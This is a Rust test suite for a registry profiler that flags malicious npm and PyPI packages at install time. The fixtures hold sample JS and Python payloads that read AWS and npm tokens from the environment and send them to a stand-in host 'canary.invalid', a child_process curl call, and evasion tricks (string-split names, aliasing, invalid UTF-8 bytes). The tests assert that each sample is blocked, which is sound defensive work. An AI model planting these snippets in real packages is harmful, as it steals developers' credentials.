//! `redteam_capability_evasion` unit tests — extracted verbatim from lib.rs.

//! F1 REGRESSION SUITE — install-time profiler fails closed on obfuscation.
//!
//! THREAT: a malicious npm/PyPI package author. Previously the registry
//! profiler was a best-effort substring scanner: source that avoided the
//! literal trigger tokens (computed member access on capability roots,
//! string-built identifiers, indirect require, dynamic import/eval) profiled
//! as `Behavior::Pure` / `Verdict::Accepted` with ZERO capabilities, then ran
//! unsandboxed. The profiler now emits a `DynamicEval` capability for opaque
//! access to a capability ROOT, forcing deny-by-default. These tests assert
//! the SECURE behavior; the over-block guard ensures ordinary computed access
//! on plain local data stays Pure/Accepted.

use super::*;

fn profile_js(src: &str) -> CompileSourceReport {
    profile_js_named("innocent-utils", src)
}

fn profile_js_named(name: &str, src: &str) -> CompileSourceReport {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(source.join("index.js"), src).unwrap();
    compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: name.to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: Vec::new(),
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap()
}

fn profile_py(src: &str) -> CompileSourceReport {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(source.join("mod.py"), src).unwrap();
    compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Pypi,
        name: "innocent-pylib".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: Vec::new(),
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap()
}

// Baseline: the literal form is still correctly detected.
#[test]
fn literal_exfil_is_blocked_baseline() {
    let r = profile_js(
            "const e = process.env.AWS_SECRET_ACCESS_KEY;\n             fetch('https://canary.invalid/c?k=' + e);\n",
        );
    assert_eq!(r.artifact.behavior, Behavior::HostCapability);
    assert_eq!(r.artifact.verdict, Verdict::Blocked);
}

// FIXED: the string-split obfuscation that previously installed as
// Pure/Accepted now fails closed.
#[test]
fn obfuscated_exfil_is_blocked() {
    let r = profile_js(
            "const e = process['en'+'v']['AWS_SECRET_ACCESS_KEY'];\n             const send = globalThis['fet'+'ch'];\n             send('https://canary.invalid/c?k=' + e);\n",
        );
    assert_eq!(
        r.artifact.behavior,
        Behavior::HostCapability,
        "obfuscated host access must not profile as Pure"
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "obfuscated env->network exfil must not install as Accepted"
    );
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::DynamicEval),
        "opaque capability-root access must emit a DynamicEval capability"
    );
}

// Each individual opaque-dynamism vector fails closed (Blocked).
#[test]
fn opaque_capability_root_access_fails_closed() {
    for src in [
        // computed access on dangerous roots
        "const x = process['en'+'v'];",
        "const f = globalThis['fetch'];",
        "const r = require['main'];",
        "const cp = child_process['spawn'];",
        "const g = global['process'];",
        // indirect require
        "const r = require; r('child_process');",
        // dynamic import
        "const m = import('./' + name);",
        // new Function / eval constructor
        "const f = new Function('return process.env');",
        // string-built capability identifier
        "const k = globalThis['fet'+'ch'];",
    ] {
        let r = profile_js(src);
        assert_eq!(
            r.artifact.verdict,
            Verdict::Blocked,
            "opaque source must fail closed: {src:?} -> caps {:?}",
            r.artifact.capabilities
        );
    }
}

#[test]
fn opaque_python_dynamism_fails_closed() {
    for src in [
        "import importlib\nm = importlib.import_module(name)\n",
        "m = __import__(name)\n",
        "f = getattr(os, attr)\n",
        "c = compile(src, '<s>', 'exec')\n",
        "g = globals()['secret']\n",
    ] {
        let r = profile_py(src);
        assert_eq!(
            r.artifact.verdict,
            Verdict::Blocked,
            "opaque python source must fail closed: {src:?} -> caps {:?}",
            r.artifact.capabilities
        );
    }
}

// OVER-BLOCK GUARD: ordinary computed access on PLAIN local objects/arrays
// and a literal project-file read must still profile Pure / Accepted.
#[test]
fn ordinary_computed_access_stays_pure() {
    let r = profile_js(
        "function pick(obj, keys) {\n\
             const out = {};\n\
             for (const k of keys) { out[k] = obj[k]; }\n\
             const first = keys[0];\n\
             const arr = [1, 2, 3];\n\
             return out[first] + arr[1];\n\
             }\n\
             module.exports = pick;\n",
    );
    assert_eq!(
        r.artifact.behavior,
        Behavior::Pure,
        "computed access on plain local objects/arrays must stay Pure; caps {:?}",
        r.artifact.capabilities
    );
    assert_eq!(r.artifact.verdict, Verdict::Accepted);
}

#[test]
fn ordinary_python_getattr_on_self_stays_pure() {
    let r = profile_py(
        "def render(self, name):\n    value = getattr(self, name, None)\n    return value\n",
    );
    assert_eq!(
        r.artifact.behavior,
        Behavior::Pure,
        "getattr on a plain local object must stay Pure; caps {:?}",
        r.artifact.capabilities
    );
    assert_eq!(r.artifact.verdict, Verdict::Accepted);
}

// PRECISION: a clean literal import of an ORDINARY module — a lazy import of
// an optional dependency or a package submodule — and Python's grouped import
// statement `from x import (a, b)` must stay Pure/Accepted. Before this, the
// grouped import tripped the JS dynamic-`import(` detector and every literal
// dynamic import was treated as opaque, blocking pure libraries like idna.
#[test]
fn benign_python_dynamic_imports_stay_pure() {
    for src in [
        // grouped import list (the idna/attrs false positive)
        "from . import (\n    intranges,\n    package_data,\n)\n",
        "from idna import (core, idnadata)\n",
        // literal lazy import of an ordinary module / package submodule
        "import importlib\nm = importlib.import_module(\"idna.idnadata\")\n",
        "m = __import__(\"json\")\n",
        "from importlib import import_module\nx = import_module('collections.abc')\n",
        // relative literal submodule import
        "import importlib\nm = importlib.import_module(\".tables\", __name__)\n",
    ] {
        let r = profile_py(src);
        assert_eq!(
            r.artifact.behavior,
            Behavior::Pure,
            "benign literal/grouped import must stay Pure: {src:?} -> caps {:?}",
            r.artifact.capabilities
        );
        assert_eq!(r.artifact.verdict, Verdict::Accepted, "{src:?}");
    }
}

// ALIASING — binding a capability ROOT to a variable first must NOT slip past
// the marker scans. Each alias form below previously profiled Pure/Accepted
// because detection keyed on the literal `process.env` / `child_process` /
// `os.environ` surface tokens; the conservative alias pre-pass now resolves the
// alias back to its root so the existing scans fire and the package blocks.
#[test]
fn js_aliased_env_read_via_process_binding_is_blocked() {
    let r = profile_js(
        "const proc = process;\n\
         const e = proc.env.NPM_TOKEN;\n\
         fetch('https://canary.invalid/c?k=' + e);\n",
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "aliased process.env read must fail closed; caps {:?}",
        r.artifact.capabilities
    );
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::EnvRead),
        "aliased process binding must still register an EnvRead; caps {:?}",
        r.artifact.capabilities
    );
}

#[test]
fn js_aliased_child_process_require_is_blocked() {
    let r = profile_js(
        "const cp = require('child_process');\n\
         cp.execSync('curl https://canary.invalid');\n",
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "aliased child_process require must fail closed; caps {:?}",
        r.artifact.capabilities
    );
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::ProcSpawn),
        "aliased child_process must register a ProcSpawn; caps {:?}",
        r.artifact.capabilities
    );
}

#[test]
fn py_aliased_environ_via_import_as_is_blocked() {
    let r = profile_py(
        "import os as m\n\
         token = m.environ['NPM_TOKEN']\n\
         import requests\n\
         requests.post('https://canary.invalid', data=token)\n",
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "aliased os.environ read must fail closed; caps {:?}",
        r.artifact.capabilities
    );
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::EnvRead),
        "import os as m -> m.environ must register an EnvRead; caps {:?}",
        r.artifact.capabilities
    );
}

#[test]
fn py_aliased_environ_via_from_import_as_is_blocked() {
    let r = profile_py(
        "from os import environ as e\n\
         token = e['NPM_TOKEN']\n\
         import requests\n\
         requests.post('https://canary.invalid', data=token)\n",
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "from os import environ as e -> e[...] must fail closed; caps {:?}",
        r.artifact.capabilities
    );
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::EnvRead),
        "from-import alias of environ must register an EnvRead; caps {:?}",
        r.artifact.capabilities
    );
}

// CONTROL: ordinary aliasing of NON-capability values must stay Pure/Accepted.
// `const x = obj.process` (obj is a plain local object, not the global) and a
// local rebinding must NOT be treated as a capability root alias.
#[test]
fn ordinary_non_capability_alias_stays_pure() {
    let r = profile_js(
        "function run(obj) {\n\
             const proc = obj.process;\n\
             const handler = obj.handler;\n\
             const env = obj.config.env;\n\
             return proc(handler, env);\n\
             }\n\
             module.exports = run;\n",
    );
    assert_eq!(
        r.artifact.behavior,
        Behavior::Pure,
        "aliasing a member of a plain local object must stay Pure; caps {:?}",
        r.artifact.capabilities
    );
    assert_eq!(r.artifact.verdict, Verdict::Accepted);
}

// NON-UTF8 FAIL-CLOSED — a malicious exfil payload prefixed/embedded with an
// invalid UTF-8 byte previously yielded an EMPTY decoded string (read_to_string
// failed), so the file was NOT scanned yet still installed. The profiler now
// decodes lossily AND fails closed on the deliberate mangling, so neither a JS
// nor a Python payload can profile as Pure/Accepted.
#[test]
fn non_utf8_js_payload_is_not_accepted() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    let mut bytes = vec![0xFFu8]; // invalid UTF-8 prefix hiding the payload
    bytes.extend_from_slice(
        b"const e = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://canary.invalid/c?k=' + e);\n",
    );
    fs::write(source.join("index.js"), &bytes).unwrap();
    let r = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "innocent-utils".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: Vec::new(),
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_ne!(
        r.artifact.behavior,
        Behavior::Pure,
        "non-UTF8 JS payload must not profile as Pure; caps {:?}",
        r.artifact.capabilities
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "non-UTF8 JS payload must not install as Accepted; caps {:?}",
        r.artifact.capabilities
    );
    // The payload is still scanned best-effort (lossy) AND the mangling itself
    // fails closed via a DynamicEval capability.
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::DynamicEval),
        "deliberate non-UTF8 mangling must emit a DynamicEval; caps {:?}",
        r.artifact.capabilities
    );
}

#[test]
fn non_utf8_py_payload_is_not_accepted() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    let mut bytes =
        b"import os\nimport requests\ntoken = os.environ['AWS_SECRET_ACCESS_KEY']\n".to_vec();
    bytes.push(0xFE); // invalid UTF-8 byte embedded in the payload
    bytes.extend_from_slice(b"\nrequests.post('https://canary.invalid', data=token)\n");
    fs::write(source.join("mod.py"), &bytes).unwrap();
    let r = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Pypi,
        name: "innocent-pylib".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: Vec::new(),
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_ne!(
        r.artifact.behavior,
        Behavior::Pure,
        "non-UTF8 Python payload must not profile as Pure; caps {:?}",
        r.artifact.capabilities
    );
    assert_eq!(
        r.artifact.verdict,
        Verdict::Blocked,
        "non-UTF8 Python payload must not install as Accepted; caps {:?}",
        r.artifact.capabilities
    );
    assert!(
        r.artifact
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::DynamicEval),
        "deliberate non-UTF8 mangling must emit a DynamicEval; caps {:?}",
        r.artifact.capabilities
    );
}

// SECURITY GUARD: the precision must NOT open a hole. A dynamic import whose
// target is a capability-bearing module (even as a literal), or is computed
// (variable / f-string / concatenation), must still fail closed — that is how
// an attacker would load os/subprocess opaquely to dodge call-site detection.
#[test]
fn dangerous_or_computed_python_imports_fail_closed() {
    for src in [
        // literal import of a capability module
        "import importlib\nm = importlib.import_module(\"subprocess\")\n",
        "m = __import__(\"os\")\n",
        "x = __import__(\"ctypes\")\n",
        "import importlib\nm = importlib.import_module(\"socket\")\n",
        // computed module name (variable / concat / f-string)
        "import importlib\nm = importlib.import_module(modname)\n",
        "m = __import__(\".\" + sub)\n",
        "import importlib\nm = importlib.import_module(f\"pkg.{name}\")\n",
        // importlib file/spec loaders are always opaque
        "import importlib.util as u\ns = u.spec_from_file_location('m', path)\n",
    ] {
        let r = profile_py(src);
        assert_eq!(
            r.artifact.verdict,
            Verdict::Blocked,
            "dangerous/computed import must fail closed: {src:?} -> caps {:?}",
            r.artifact.capabilities
        );
        assert!(
            r.artifact
                .capabilities
                .iter()
                .any(|c| c.kind == CapabilityKind::DynamicEval),
            "must emit DynamicEval: {src:?}"
        );
    }
}
